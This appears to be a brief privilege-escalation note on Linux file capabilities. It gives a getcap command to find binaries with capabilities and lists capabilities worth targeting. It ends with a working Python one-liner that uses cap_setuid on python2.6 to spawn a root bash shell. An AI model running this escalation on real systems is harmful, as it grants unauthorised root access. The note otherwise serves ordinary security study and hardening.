### Detection

##### Search for Files with Capabilities
```
getcap -r / 2>/dev/null
```

- `getcap`: List the ***file capabilities*** set on executable files. Capabilities are a way to grant specific privileges to programs without needing to give them full root access via SUID.

##### Notice the `cap_setuid` Capability
```
/usr/bin/python2.6 = cap_setuid+ep
```

- `/usr/bin/python2.6` has the `cap_setuid+ep` capability set, allowing it to change its user ID.

	`Key Capabilities to Target`
	- `cap_setuid`: Allows a program to change its user ID (`UID').
	- `cap_setgid`: Allows a program to change its group ID (`GID').
	- `cap_dac_override`: Overrides DAC, allowing a program to bypass file permissions.
	- `cap_sys_admin`: Provides various system administration capabilities.

### Exploitation
```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- `os.setuid(0)`: Changes the user ID of the running process to `0`.
- `os.system("/bin/bash")`: Executes the bash shell as the root user, giving you a root shell.

